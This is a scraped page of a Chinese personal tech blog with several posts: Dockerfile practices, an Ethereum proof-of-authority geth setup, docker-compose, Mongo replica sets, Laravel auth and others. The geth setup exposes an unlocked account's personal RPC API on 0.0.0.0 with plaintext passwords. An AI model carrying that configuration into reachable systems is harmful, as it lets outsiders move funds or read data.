\u0026amp;\u0026amp; mv hello context docker build --no-cache -t helloapp:v2 -f dockerfiles/Dockerfile context 沒有需要進入 build context 的 file 就不要放在 context 中，避免花費額外資源建立 image 寫進去．在建立context的過程會看到如下圖的資訊\nSending build context to Docker daemon 187.8MB Pipe Dockerfile through stdin 善用stdin 建立一次性的 docker build\n# The examples in this section use here documents for convenience, # but any method to provide the Dockerfile on stdin can be used. # For example, the following commands are equivalent: echo -e \u0026#39;FROM busybox\\nRUN echo \u0026#34;hello world\u0026#34;\u0026#39; | docker build - # or docker build -\u0026lt;\u0026lt;EOF FROM busybox RUN echo \u0026#34;hello world\u0026#34; EOF 使用 stdin 實現不發送 build context 的 dockerfile 建立 使用下面的語法把 Dockerfile 發送到 stdin 中建立 image 並不發送 build context\n# The hyphen (-) takes the position of the PATH, # and instructs Docker to read the build context (which only contains a Dockerfile) from stdin instead of a directory docker build [OPTIONS] - 下面的語法展示了如何傳入一個 Dockerfile 到 stdin 中\ndocker build -t myimage:latest -\u0026lt;\u0026lt;EOF FROM busybox RUN echo \u0026#34;hello world\u0026#34; EOF 忽略 build context 在當你不需要任何檔案複製到 image 時特別有用，可以用更快的速度建立 image\n另一個方法是使用 .dockerignore 來縮減 build context，語法同 .gitignore，更多相關內容參考 exclude with .dockerignore\n上述內容參考範例\n# Note: Attempting to build a Dockerfile that uses COPY or ADD will fail if this syntax is used. # The following example illustrates this: # create a directory to work in mkdir example cd example # create an example file touch somefile.txt docker build -t myimage:latest -\u0026lt;\u0026lt;EOF FROM busybox COPY somefile.txt . RUN cat /somefile.txt EOF # observe that the build fails ... Step 2/3 : COPY somefile.txt . COPY failed: stat /var/lib/docker/tmp/docker-builder249218248/somefile.txt: no such file or directory 使用 stdin 在本地建立 local build context 使用下面的語法把 Dockerfile 發送到 stdin 中建立 image 並發送 build context\n# using a hyphen (-) as filename to instruct Docker to read the Dockerfile from stdin docker build [OPTIONS] -f- PATH 下面的範例把 . 當作 build context 發送\n# create a directory to work in mkdir example cd example # create an example file touch somefile.txt # build an image using the current directory as context, and a Dockerfile passed through stdin docker build -t myimage:latest -f- . \u0026lt;\u0026lt;EOF FROM busybox COPY somefile.txt . RUN cat /somefile.txt EOF BUILD FROM A REMOTE BUILD CONTEXT, USING A DOCKERFILE FROM STDIN 使用以下的語法接收遠端的 build context 以建立 image\ndocker build [OPTIONS] -f- PATH 同上面的語法，不過把 path 的部分換成遠端的 build context即可\ndocker build -t myimage:latest -f- https://github.com/docker-library/hello-world.git \u0026lt;\u0026lt;EOF FROM busybox COPY hello.c . EOF 這個方法在想要 build 的 image 沒有 Dockerfile 或是不想要 clone repo 下來管理時特別好用\n注意事項 當使用遠端的 repo 作為 build context 的時候，docker 會進行 git clone並把repo的東西發送給 docker daemon，因此本機需要有裝 git\nExclude with .dockerignore 用法同 .gitignore 更多說明參考 .dockerignore file\n進行多階段 builds 多階段建置讓你能夠再不用糾結於縮減層數的情況下大幅地減少最終 image 的大小\n因為 image 在建立最終階段的過程中已經被 build 過了，可以使用 leveraging build cache 的技巧減少 layers\n舉例來說，你可以調整順序讓改變頻率較低的 layer 拉到改變頻率較高的 layer 中以確保 build cache 可以被重複使用，參考以下順序\nInstall tools you need to build your application Install or update library dependencies Generate your application 以下舉個 go 的例子\nFROM golang:1.11-alpine AS build # Install tools required for project # Run `docker build --no-cache .` to update dependencies RUN apk add --no-cache git RUN go get github.com/golang/dep/cmd/dep # List project dependencies with Gopkg.toml and Gopkg.lock # These layers are only re-built when Gopkg files are updated COPY Gopkg.lock Gopkg.toml /go/src/project/ WORKDIR /go/src/project/ # Install library dependencies RUN dep ensure -vendor-only # Copy the entire project and build it # This layer is rebuilt when a file changes in the project directory COPY . /go/src/project/ RUN go build -o /bin/project # This results in a single layer image FROM scratch COPY --from=build /bin/project /bin/project ENTRYPOINT [\u0026#34;/bin/project\u0026#34;] CMD [\u0026#34;--help\u0026#34;] 不要安裝不必要的 package 解耦應用程式 每個 container 應該只考慮一件事，這樣才能保持 container 的可規模化與重用性\n另外，限制每個 container 只能使用一個 process 雖然是個好的經驗法則 ，但不是個硬性規定，比如說 apache 預設 worker 本身會對每個 request 開啟一個 process\n盡量在不同的情況下保留 container 的簡單與模組性，如果彼此有相依性則可使用 networks 的設定確保彼此可以溝通\n最小化 layers 數量 在早期的 docker 版本中，最小化 layers 的數量是很重要的，為此 docker 有進行過一系列優化如下\n只有 RUN、 COPY、 ADD會建立 layers，其餘的建立暫存的中介 image，這些 image 不會增加 build 的大小 在可能的時候使用 multi-stage builds，並指把必要的東西放到最終的 image 中．這樣可以讓你在不增加 image 大小的情況下取得更多 debug 的資訊 Sort multi-line arguments 在可能的時候把改變的順序依照字母進行排序，這樣可以讓後續使用者更好維護，參考如下\nRUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ bzr \\ cvs \\ git \\ mercurial \\ subversion Leverage build cache docker 在 build image 的時候是依照 Dockerfile 的指令順序執行．當每個指令被執行的時候 docker 會去尋找是否有被 cache 的 image\n如果不想使用 cache 的話加入--no-cache=true 即可．以下為 docker 找尋 cache 的基本大綱\nStarting with a parent image that is already in the cache, the next instruction is compared against all child images derived from that base image to see if one of them was built using the exact same instruction. If not, the cache is invalidated. In most cases, simply comparing the instruction in the Dockerfile with one of the child images is sufficient. However, certain instructions require more examination and explanation. For the ADD and COPY instructions, the contents of the file(s) in the image are examined and a checksum is calculated for each file. The last-modified and last-accessed times of the file(s) are not considered in these checksums. During the cache lookup, the checksum is compared against the checksum in the existing images. If anything has changed in the file(s), such as the contents and metadata, then the cache is invalidated. Aside from the ADD and COPY commands, cache checking does not look at the files in the container to determine a cache match. For example, when processing a RUN apt-get -y update command the files updated in the container are not examined to determine if a cache hit exists. In that case just the command string itself is used to find a match. 當 cache 失效的時候所有後續的指令會建立新的 image\nDockerfile instructions\nentrypoint 範例 #!/bin/bash set -e if [ \u0026#34;$1\u0026#34; = \u0026#39;postgres\u0026#39; ]; then chown -R postgres \u0026#34;$PGDATA\u0026#34; if [ -z \u0026#34;$(ls -A \u0026#34;$PGDATA\u0026#34;)\u0026#34; ]; then gosu postgres initdb fi exec gosu postgres \u0026#34;$@\u0026#34; fi exec \u0026#34;$@\u0026#34; # Configure app as PID 1 # This script uses the exec Bash command so that the final running application becomes the container’s PID 1. # This allows the application to receive any Unix signals sent to the container. # For more, see the ENTRYPOINT reference. # https://stackoverflow.com/questions/39082768/what-does-set-e-and-exec-do-for-docker-entrypoint-scripts # set -e .... exec \u0026#34;$@\u0026#34; basically takes all the extra command line arguments and execs them as a command. 其他官方範例 Go Perl Hy Ruby ","permalink":"http://shachiku.life/2021/06/dockerfile-best-practices/","summary":"很難翻出原始意義的就不翻","title":"[翻譯]Best practices for writing Dockerfiles"},{"contents":"這篇是很粗淺的心得，畢竟才踏入半年左右\n這兩年股市的變化實在精彩，因為疫情影響+美國無限QE政策，造成市場上熱錢滿滿，錢放著不動只會越來越貶值已經成為全民共識，擦鞋童與少年股神們蜂擁而出，成就股市大多頭時代，一天上下沒有個 5% 都不像是在玩股票。\n奈米韭菜小弟我自然不想錯過這個機會，趕在 2020 年底跳進這韭菜園體驗股票的魅力。\n首先看面向\n籌碼面：就是看錢都流到哪些產業類股，通常財經新聞都會有統計，個股的話還要注意主力的成本均價、哪些主力買的（有些主力是著名的隔日沖） 消息面：就是新聞報了什麼，每天財經新聞看看就知道 基本面：財報相關的資訊，我只有看YoY、MoM、eps、連續 n 年發放股利與否 技術面：這塊我研究比較少，只有注意 KD、MACD 的黃金/死亡交叉以及均線來找買賣點 總體來看：籌碼 \u0026gt; 技術 \u0026gt; 基本 \u0026gt;= 消息，依不同持有時間會有不同排序：\n短：籌碼 \u0026gt;= 技術 \u0026gt; 消息 \u0026gt; 基本\n長：籌碼 \u0026gt;= 基本 \u0026gt; 技術 \u0026gt; 消息\n持有時間常跟短怎麼定義？看預期投報率。不同的預期會有不同操作決策，簡單舉個例子：\n3 天賺 10%：標的少（1檔），停損 2%，停利 10％（也只有現在這種大多頭時代+強勢股才有機會）\n3 個月賺 20%：標的多（5檔），停損 10%（每檔 2%），停利 20%（每檔 4%）\n最後講講一些過程 一開始目標是賺到年薪 +10%，沒想到第一週帳面就達成了？！結果第二週馬上得到教訓直接 -10% 後直接停損\n開戶滿 3 個月累計 10 筆交易後可以玩當沖，第一次玩的感覺是「可怕」，我戶頭裡根本不需要有足夠的錢就能買賣賺價差，難怪一堆無本當沖賠光跳樓的\n中間靠當沖小賺一點點，之後就不太敢玩了，因為一買下去連 0.5 的數字都會造成很大的心理壓力\n抱著從哪裡跌倒要從哪裡爬起來的精神，繼續靠其他標的慢慢賺回賠掉的部分，結果又因為貪，看到超級飆股在頂點時追入，再度 -10%\n調整好心態又漸漸賺回來，想說我也是蠻厲害的，就依照自己個感覺去買入標地，又再 -10%\u0026hellip;\n現在只希望把賠的賺回來就好，不期待大賺\n完全不敢開融資，只用本金玩的就已經快受不了了，那些融資歐印的少年股神們心臟大概都是葉克膜做的吧\n","permalink":"http://shachiku.life/2021/05/about-stock/","summary":"對韭當割，等我賠光大概就有（2）了","title":"韭菜成長心得（1）"},{"contents":"簡單記錄一下\nOverview Terminology term desc ether 以太幣本身 evm 由各 nodes 組成的一台大型狀態管理機，每個 node 裡面都有實現 evm yellow papaer的程式對整體狀態管理 accounts where ether is stored transactions 由 account 發出的修改 EVM 狀態的訊息 smart contract reusable snippets of code gas 手續費，每次執行 contract 時須繳付 wei 最小單位 Account 分成兩種類型\nExternal actor(EOA) 一般的 account，概念同 bitcoin 的 account，由 private key 控制，不能包含 EVM code（smart contract）\nContract account 由 EVM code 控制，實際執行 contract 的 account\n運算方式介紹 POW 已算力達成共識的方式，為主流方法，但難以擴展\n挖礦叫做 mining\nPOS 以 stake 量達成共識的方式，跟資本主義滿像，誰有錢誰就有話語權\n挖礦叫做 minting\nPOA 主動選擇被驗證的節點作為驗證者，意為以個人信譽為主，於有限節點的私有練較適合使用，跟當兵差不多，找幾個排長幫忙管理，容易擴展\n挖礦叫做 sealing\n架設 POA 環境 要架設 POA 至少要有 2 個節點，雖然可以用一個節點跑不過這樣就不帶有 POA 的意義\ninstall lib sudo add-apt-repository -y ppa:ethereum/ethereum sudo apt-get update sudo apt-get install ethereum make nodes mkdir node-a # create account geth --datadir node-a account new # enter password then you will see something like below #################################################################### # Your new key was generated # Public address of the key: 0x5135f59f4De410eb731cEb901e611a1070dFD115 # Path of the secret key file: node-a/keystore/UTC--2021-01-26T03-31-40.300431739Z--5135f59f4de410eb731ceb901e611a1070dfd115 #################################################################### # save account \u0026amp; password echo \u0026#39;5135f59f4de410eb731ceb901e611a1070dfd115\u0026#39; \u0026gt;\u0026gt; accounts.txt echo \u0026#39;password\u0026#39; \u0026gt;\u0026gt; node-a/password.txt # make second node mkdir node-b geth --datadir node-b account new # ... echo \u0026#39;node-b-account\u0026#39; \u0026gt;\u0026gt; accounts.txt echo \u0026#39;password\u0026#39; \u0026gt;\u0026gt; node-b/password.txt create genesis file # use build-in interactive cli is more confortable puppeth # begin Please specify a network name to administer (no spaces, hyphens or capital letters please) \u0026gt; any-name What would you like to do? (default = stats) 1. Show network stats 2. Configure new genesis 3. Track new remote server 4. Deploy network components \u0026gt; 2 What would you like to do? (default = create) 1. Create new genesis from scratch 2. Import already existing genesis \u0026gt; 1 Which consensus engine to use? (default = clique) 1. Ethash - proof-of-work 2. Clique - proof-of-authority \u0026gt; 2 How many seconds should blocks take? (default = 15) \u0026gt; 3 # mining time for each block Which accounts are allowed to seal? (mandatory at least one) \u0026gt; 0x5135f59f4de410eb731ceb901e611a1070dfd115 \u0026gt; 0x2eb60ab83554e73eb85ea2c218f2cd4cf75ca82d \u0026gt; 0x Which accounts should be pre-funded? (advisable at least one) \u0026gt; 0x5135f59f4de410eb731ceb901e611a1070dfd115 \u0026gt; 0x2eb60ab83554e73eb85ea2c218f2cd4cf75ca82d \u0026gt; 0x Should the precompile-addresses (0x1 .. 0xff) be pre-funded with 1 wei? (advisable yes) \u0026gt; y Specify your chain/network ID if you want an explicit one (default = random) \u0026gt; 42 What would you like to do? (default = stats) 1. Show network stats 2. Manage existing genesis 3. Track new remote server 4. Deploy network components \u0026gt; 2 What would you like to do? (default = stats) 1. Show network stats 2. Manage existing genesis 3. Track new remote server 4. Deploy network components \u0026gt; 2 1. Modify existing configurations 2. Export genesis configurations 3. Remove genesis configuration \u0026gt; 2 Which folder to save the genesis specs into? (default = current) Will create 42.json, 42-aleth.json, 42-harmony.json, 42-parity.json \u0026gt; # end # then you can see genesis file ls # 42-harmony.json 42.json accounts.txt node-a node-b init nodes geth --datadir node-a init 42.json geth --datadir node-b init 42.json create bootnode nodes 間使用 bootnode 來找到彼此 bootnode -genkey boot.key # start bootnode -nodekey boot.key -verbosity 9 -addr :30310 # copy enode hash # enode://22b3bc9b4d95b30f3e1ceea30738bea44876e8437e1b757a3127c56eef3efa6684f7356e5c45a4a49ae72a1bca7800aba5fac494da222d97e68a8db2b48fc99e@127.0.0.1:0?discport=30310 export BOOTNODE_HASH=enode://22b3bc9b4d95b30f3e1ceea30738bea44876e8437e1b757a3127c56eef3efa6684f7356e5c45a4a49ae72a1bca7800aba5fac494da222d97e68a8db2b48fc99e@127.0.0.1:0?discport=30310 start nodes # node-a with json RPC port enable geth --datadir ./node-a --syncmode \u0026#39;full\u0026#39; --http --http.addr \u0026#39;0.0.0.0\u0026#39; --http.port 8545 --http.api \u0026#39;personal,eth,net,web3,txpool,miner\u0026#39; --networkid 42 --port 30303 --bootnodes $BOOTNODE_HASH --gasprice \u0026#39;20\u0026#39; -unlock \u0026#39;0x5135f59f4de410eb731ceb901e611a1070dfd115\u0026#39; --password ./node-a/password.txt --mine --allow-insecure-unlock # node-b geth --datadir ./node-b --syncmode \u0026#39;full\u0026#39; --networkid 42 --port 30304 --bootnodes $BOOTNODE_HASH --gasprice \u0026#39;20\u0026#39; -unlock \u0026#39;0x2eb60ab83554e73eb85ea2c218f2cd4cf75ca82d\u0026#39; --password ./node-b/password.txt --mine --allow-insecure-unlock # if you don\u0026#39;t see \u0026#34;looking for peers\u0026#34; then success else go into geth and set node manually geth attach node-a/geth.ipc admin.addPeer(\u0026#39;0x5135f59f4de410eb731ceb901e611a1070dfd115\u0026#39;) admin.peers # check 完成後就可以用任意 client 對他寫程式了\nReferences Proof of authority Proof of stake Proof of work ethereum developer doc ethernum evm illustrated ","permalink":"http://shachiku.life/2021/01/ethereum-poa/","summary":"使用 ubuntu 20.04","title":"Ethereum POA 架設"},{"contents":" 設定多個 hosts version: \u0026#39;3.8\u0026#39; x-hosts: \u0026amp;x-hosts - \u0026#39;mysql:172.29.0.3\u0026#39; - \u0026#39;app:172.29.0.4\u0026#39; - \u0026#39;influxdb:172.29.0.5\u0026#39; ... app: extra_hosts: *x-hosts build with context ... app: build: context: . dockerfile: ./.docker/Dockerfile.xxx-xx connect other network bridge # docker-compose-1.yml version: \u0026#39;3.7\u0026#39; ... services: svc1: networks: - custom_name networks: custom_name: # 這邊是類似 namespace 的概念 driver: bridge # docker-compose-2.yml version: \u0026#39;3.7\u0026#39; ... services: svc1: networks: - mynet ... networks: mynet: external: name: folder_custom_name pre-existing version: \u0026#39;3.7\u0026#39; ... services: svc1: networks: - network_name # 只要指定 external true 即可 networks: network_name: external: true virtual volume 用他的好處是不用特別綁定路徑，且也可避免 host 真的要裝該服務時路徑衝突問題，比較適用的場景為一次只有一個專案的情境 ... services: postgres: image: postgres:13.2 restart: unless-stopped - POSTGRES_USER=root - POSTGRES_PASSWORD=root volumes: - postgres:/var/lib/postgresql/data volumes: postgres: ","permalink":"http://shachiku.life/2020/12/docker-compose-yml-tips/","summary":"","title":"Docker Compose yml 小技巧"},{"contents":" kickturn 翻譯為踢轉，是滑板的基礎技巧之一，可以做到比較大幅度的轉彎\n玩滑板剛滿一個月，覺得身體變好，心情愉悅，寫 code 越寫越快，測試都有 100% 覆蓋率了\n最近才抓到一點 heelside 180 kickturn 的感覺和技巧以及外傷包紮的技能（感謝 7-11 的密度）\n目前 toeside 大概有 6 成左右的成功率， heelside 只有 1 成，不過幾乎不會摔了是一大進步，趕緊發篇文記錄一下 主要的重點在重心跟軸線的維持，以及用「頭-上身-下身」的順序帶動你的板子，眼睛朝板頭要落下的地方看\n實際轉的時候下半身會有一點用甩的感覺，所以做 heelside 時上半身微微往後傾是有幫助的（這超可怕，可是有用），把重心稍稍往後帶，再用腳拉回來讓身體穩住\n另外他比起 toeside 難好幾倍的原因是，toeside 你可以輕易地做到「頭-上身-下身」的順序，heelside 就幾乎是頭跟身體同時要轉，如果重心沒維持好超級容易把板子採太高進而噴板，所以才會有轉的時候要把重心壓在前腳的說法，最近發現實際上的感覺是維持「頭-上身-下身」的順序。\n個人的技巧是轉之前臉朝板頭，雙手收到腰間再往外甩出，如果你是 regular 就是收到右後腰，往左前甩出，goofy 就反過來。這樣頭要轉動的幅度比較小，就比較容易維持順序\n另外多滑行也有幫助喔～\n接下來的練習的重點就是旋轉時維持重心跟軸線，繼續加油！\n備註 heelside: 腳跟朝向的方向，就是站立時的背面，又稱 frontside，因為是臉朝向的方向 toeside: 腳尖朝向的方向，站立時的正面，又稱 backside regular: 左腳在前右腳在後 goofy: 右腳在前左腳在後 ","permalink":"http://shachiku.life/2020/12/skateboard-kickturn/","summary":"最近一直瘋狂下雨讓我都不能溜河濱～","title":"Skateboard Kickturn"},{"contents":"善用 shortcode 以及 override theme 的觀念即可\n這裡用 mermaid-js 當範例\nstep1. add short code layouts/shortcodes/mermaid.html\n\u0026lt;div class=\u0026#34;mermaid\u0026#34;\u0026gt;{{ .Inner }}\u0026lt;/div\u0026gt; step2. add custom theme layouts/partials/footer.html\n... {{ if (.Params.mermaid) }} \u0026lt;script async src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.8.4/mermaid.min.js\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; {{ end }} step3. add post parameter content/posts/xxxxx.md\nmermaid: true done sequenceDiagram A-\u003e\u003eB: hello B-\u003e\u003eA: world ","permalink":"http://shachiku.life/2020/12/add-js-support-on-hugo/","summary":"以美人魚為例","title":"在 Hugo 中加入 js library"},{"contents":"python 3 原生提供了一個簡易的 cache decorator 叫 lru_cache，可以把耗時的函數執行結果儲存起來，一段時間就刪掉\n舉例來說下面這段 code\n@lru_cache() def say_hi(name: str): return f\u0026#39;Hello {name}\u0026#39; 的循序圖大概長這樣 sequenceDiagram code-\u003e\u003esay_hi(): say_hi(name='test') say_hi()-\u003e\u003efunc: exec func--\u003e\u003ecode: result code-\u003e\u003esay_hi(): say_hi(name='test') say_hi()--\u003e\u003ecode: result code-\u003e\u003esay_hi(): say_hi(name='tom') say_hi()-\u003e\u003efunc: exec func--\u003e\u003ecode: result code-\u003e\u003esay_hi(): say_hi(name='tom') say_hi()--\u003e\u003ecode: result code-\u003e\u003esay_hi(): say_hi(name='test') say_hi()--\u003e\u003ecode: result 搭配 magic method 可以對設定的東西做到簡單的 cache 功能 ","permalink":"http://shachiku.life/2020/12/use-lru-cache-for-setting/","summary":"蟒蛇小技巧","title":"善用 lru_cache 對設定檔進行 cache"},{"contents":"Steps 1. create new ssh pair ssh-keygen -t rsa -C \u0026#39;myemail@example.com\u0026#39; -f id_rsa_mygit 2. edit ~/.ssh/config # company github account Host github.com HostName github.com IdentityFile ~/.ssh/id_rsa IdentitiesOnly yes # my github account Host github-mygit HostName github.com IdentityFile ~/.ssh/id_rsa_mygit IdentitiesOnly yes 3. add into ssh-agent ssh-add -D \u0026amp;\u0026amp; ssh-add -L # reset all ssh keys, optional # add them into ssh-agent ssh-add ~/.ssh/id_rsa ssh-add ~/.ssh/id_rsa_mygit # ...other keys if you want # test connection ssh -T git@github.com ssh -T git@github-mygit 4. clone your git project git clone git@github-mygit:xxxxx/xxxxx.git About submodule 修改其於 .git/modules/\u0026lt;folder\u0026gt;/config 裡的設定\n... [remote \u0026#34;origin\u0026#34;] url = git@github.com-mygit:xxxxx/xxxxx.git fetch = +refs/heads/*:refs/remotes/origin/* ... 這樣就可以正常使用不同 github 帳號的 ssh key 了\nReference https://deepzz.com/post/how-to-setup-ssh-config.html ","permalink":"http://shachiku.life/2020/12/multi-git-ssh-key/","summary":"因公司使用 github 作為代管平台，發現在 github 上同一組 ssh key 不能直接被加到另一個 github 帳號裡面，於是有了這篇文章","title":"在 github 上多帳號與多組 ssh key 使用"},{"contents":"redis sentinel 是 redis 自帶的 ha 解決方案（failover only）可以搭配 cluster 做到更 ha 的架構\n這裡提供開發時自架的方式 Reference https://redis.io/topics/sentinel ","permalink":"http://shachiku.life/2020/12/docker-create-redis-sentinel/","summary":"","title":"Docker Create Redis Sentinel"},{"contents":"最近開始學滑板，突然想到學程式時都會筆記，怎麼運動就不會了？趕緊筆記一下\n這邊紀錄滑板的分類\n長板（Long board） 具長（33~59）且寬（9~10）堅硬的板身，因腳可移動範圍較廣所以可以玩 Dancing\n交通板（Cruiser） 又稱巡航版，華語圈則稱魚板，因為外型很像一條魚。\n代步為主的一種滑板，板身窄且方便攜帶，輪子比技術版有彈性且大，常見尺寸為 22 ~ 27 不等，比較知名的品牌是 Penny\n技術板（Skateboard） 又稱雙翹板，是最常見的滑板，到 youtube 搜尋 \u0026ldquo;epic skate fail\u0026rdquo; 出現的基本上都是這種東西\n輪子較小且為硬輪，路面不平的話會震到爽死\n衝浪滑板（Surf skate） 以模擬衝浪感為主軸的滑板，輪架較高且富彈性，可以做到相當大角度的轉彎，跟衝浪行為很像。\n可輕易地做出 carving 與 pumping，不用特別 push 也可以加速到很快，知名品牌為 Carver、Yow、Smooth star\n電動滑板（Electric skateboard） 以馬達驅動的滑板，較常用於代步（個人不建議，太重了）或影片拍攝\n","permalink":"http://shachiku.life/2020/11/skateboard-categories/","summary":"滑板的分類","title":"Skateboard Category"},{"contents":"以前一直認為所謂的「系統分析師」需要理解的面相是相當廣泛且複雜的，基於此認知推斷只熟稔某些產品的情況下，是沒辦法成為一個實際意義上的 SA，但又經常在人力銀行網站上到看到各種大開 SA 職缺的企業，心中一直存有疑惑。\n直到最近遇到了所謂的「顧問」才突然明白是怎麼回事：在同為出嘴比力多的基礎之上，同溫層內就是 SA，同溫層外就是 consultant。\n然後，為何用嘴巴的總是比較好賺？\n有個寓言故事是這樣說：\n某間新創公司在搞 ERP，新創麻，一人總得當多人用，所以元老工程師就經常被帶出場～帶工程師出場聽起來有些彆扭，顧問好聽多了。官網上有個區塊叫「成功案例」，先談多一點放起來，越多我們越好談，有客戶才有錢才有你的薪水啊！！ 然後公司賺錢了，分給誰？誰談合作多就給多一點摟～\n程式有bug沒時間修怎麼辦？找人來修，邏輯懂嗎。\n","permalink":"http://shachiku.life/2020/08/murmur-4/","summary":"顧問是自然界演化過程的物種","title":"雜談（4）"},{"contents":"最近有用到 mongo 實作讀寫分離，紀錄一下\nmongo 的讀寫分離是用 replica set 實作，裡面的 node 分為 primary-secondary，不同於 mysql 的 master-slave。\n每個 replica set 只能有一個 primary node，不敷使用時其他 secondary node 會進行投票決定誰才是下一個 primary，因此要架的話最好要使用單數個 node\nnode 差別 primary node 接收所有 write 操作，搭配 write concern 設定可以確保各個 node 有無正確被寫入 接收 read / write 操作 secondary node 接收來自 primary 的 oplog 以進行 data replication 接收 read 操作 arbiter node 只出嘴不出力，跟大多數的官一樣（只有投票功能的節點） 設定方法 這裡用 keyfile 的方式，省得建帳號\nmongod.conf systemLog: destination: file logAppend: true path: /var/log/mongodb/mongod.log storage: dbPath: /var/lib/mongo journal: enabled: true net: port: 27017 bindIp: 0.0.0.0 security: authorization: enabled keyFile: /etc/mongo.d/replica-keyfile ;同把 key 要 co 到 secondary 上 replication: replSetName: \u0026#34;rs0\u0026#34; 基本上 secondary 的設定是一樣的，可以搭配 mongo shell 設定修改進入後呈現的樣子讓操作時更清楚當前位置\nreadPreference 設定讀寫分離時有個需注意的東西叫readPreference，共有五種類型，參考下表 名稱 說明 primary 預設，所有讀操作都只會從 primary 進行，如果該 node 死掉則出現 error primaryPreferred primary 死掉時會從 secondary 找，如有設定 tag 的話會從符合的 tag 中找最近的 secondary 只從 secondary 讀，secondary 全死就出錯 secondaryPreferred 如果只有兩個 node，且其中一個是 primary 的話就從 primary 讀 nearest 依 latency 選擇回應最快的節點接收讀操作 本地架設範例 docker-compose.yml version: \u0026#39;3.7\u0026#39; services: mongo_primary: restart: always image: mongo:4 volumes: - ./data:/data/db ports: - \u0026#39;27017:27017\u0026#39; entrypoint: [\u0026#39;mongod\u0026#39;, \u0026#39;--port\u0026#39;, \u0026#39;27017\u0026#39;, \u0026#39;--bind_ip_all\u0026#39;, \u0026#39;--replSet\u0026#39;, \u0026#39;rs0\u0026#39;] container_name: local_persona_mongo_primary mongo_rep1: image: mongo:4 restart: always ports: - \u0026#39;27027:27027\u0026#39; entrypoint: [\u0026#39;mongod\u0026#39;, \u0026#39;--port\u0026#39;, \u0026#39;27027\u0026#39;, \u0026#39;--bind_ip_all\u0026#39;, \u0026#39;--replSet\u0026#39;, \u0026#39;rs0\u0026#39;] container_name: local_persona_mongo_rep1 mongo_rep2: image: mongo:4 restart: always ports: - \u0026#39;27037:27037\u0026#39; entrypoint: [\u0026#39;mongod\u0026#39;, \u0026#39;--port\u0026#39;, \u0026#39;27037\u0026#39;, \u0026#39;--bind_ip_all\u0026#39;, \u0026#39;--replSet\u0026#39;, \u0026#39;rs0\u0026#39;] container_name: local_persona_mongo_rep2 進去啟動 replica docker exec -ti local_persona_mongo_primary sh # in container mongo --eval \u0026#39;rs.initiate( { _id : \u0026#34;rs0\u0026#34;,members: [{ _id: 0, host: \u0026#34;mongo_primary:27017\u0026#34; },{ _id: 1, host: \u0026#34;mongo_rep1:27027\u0026#34; },{ _id: 2, host: \u0026#34;mongo_rep2:27037\u0026#34; }]})\u0026#39; 設定本地 hosts 讓本地的 request 可以連到機器（也可以把開發環境掛在跟docker-compose一起就不用這步） sudo echo \u0026#39;127.0.0.1 mongo_primary mongo_rep1 mongo_rep2\u0026#39; \u0026gt;\u0026gt; /etc/hosts 接著就可以看你用的lib決定怎麼設定偏好，以 node 的 mongoose 舉例如下\nmodel.aggregate().read(\u0026#39;sp\u0026#39;) // secondaryPreferced model.findOne({cond},{ readPreference: \u0026#39;secondaryPreferred\u0026#39; }) Reference 官方文件 ","permalink":"http://shachiku.life/2020/07/docker-compose-mongo-replica/","summary":"小學時學到怎麼切八段，出社會後終於有學以致用的一天","title":"Mongodb 讀寫分離"},{"contents":"在 legency 專案上要變換登入要考量的事很多，其中一個情況就是 blade 大量使用 Auth Facade 做 UI 的呈現變化，加上第三方登入都跟你 token 來 token 去，不熟 auth 還真不知道怎麼下手。\n這邊提出在這種情況下比較無痛轉移的方法\n在 laravel 中修改驗證時有幾個地方要改，以下分別列出並提供範例\nconfig/auth.php \u0026lt;?php ... \u0026#39;providers\u0026#39; =\u0026gt; [ \u0026#39;users\u0026#39; =\u0026gt; [ \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;custom-driver\u0026#39;, ] ] ... AuthServiceProvider.php you can use php artisan to create provider\n\u0026lt;?php public function boot() { ... Auth::provider(\u0026#39;custom-driver\u0026#39;, function ($app, array $config) { return new YourCustomAuthProvider(); }); } YourCustomAuthProvider.php \u0026lt;?php use Illuminate\\Contracts\\Auth\\Authenticatable; use Illuminate\\Auth\\GenericUser; class YourCustomAuthProvider implements \\Illuminate\\Contracts\\Auth\\UserProvider { // implement all contrat // below is sample public function retrieveById($identifier) { return $this-\u0026gt;getUser($identifier); } public function retrieveByToken($identifier, $token) { $user = $this-\u0026gt;getUser($identifier); return isset($user[\u0026#39;remember_token\u0026#39;]) \u0026amp;\u0026amp; $user[\u0026#39;remember_token\u0026#39;] == $token ? $user : null; } public function updateRememberToken(Authenticatable $user, $token) { Session::put(\u0026#39;remember_token\u0026#39;, $token); } public function retrieveByCredentials(array $credentials) { $token = $this-\u0026gt;getAccessToken(); if(!$token) { // invalid token actions here } $data = $this-\u0026gt;getUserData($token); return new GenericUser($data); } public function validateCredentials(Authenticatable $user, array $credentials) { return yourCredentialsIsValidate() ? true: false; } } YourLoginController.php \u0026lt;?php ... use Illuminate\\Auth\\GenericUser; ... public function login(Request $request) { $data = getTokenAndUserDataFromThirdParty(); // the key-point is here Auth::guard(\u0026#39;web\u0026#39;)-\u0026gt;login(new GenericUser([\u0026#39;id\u0026#39; =\u0026gt; $data[\u0026#39;email\u0026#39;]])) // then you keep your facade works as usual } 補充：使用 redis 實現 sso redis retrive session \u0026lt;?php ... use Illuminate\\Support\\Facades\\Redis; use Illuminate\\Support\\Facades\\Auth; use SessionHandlerInterface; class RedisSessionServices implements SessionHandlerInterface { public function open($savePath, $sessionName) { return true; } public function close() { return true; } public function read($sessionId) { return Redis::get($this-\u0026gt;prefixCheck($sessionId)); } public function write($sessionId, $data) { // can add auth check if needed Redis::set($this-\u0026gt;prefixCheck($sessionId), $data, \u0026#39;EX\u0026#39;, $expireTime); return true; } public function destroy($sessionId) { Redis::del($this-\u0026gt;prefixCheck($sessionId)); return true; } public function gc($lifetime) { return true; } /** * laravel 原生會帶 :session: */ private function prefixCheck($sessionId) { $prefix = env(\u0026#39;REDIS_PREFIX\u0026#39;) . \u0026#39;:session:\u0026#39;; if (strpos($sessionId, $prefix) === false) { $sessionId = $prefix . $sessionId; } return $sessionId; } } Reference official doc\n","permalink":"http://shachiku.life/2020/06/laravel-third-party-login-auth/","summary":"覺得是很常見的需求","title":"在 laravel 中使用第三方登入並整合 Auth Facade"},{"contents":"這邊使用 python sdk 串 Google DataFlow，下面介紹相關概念\n概念介紹 Apache Beam 前身是 Google DataFlow，是一套用來執行batch/streaming data-parallel processing 的 pipeline，在 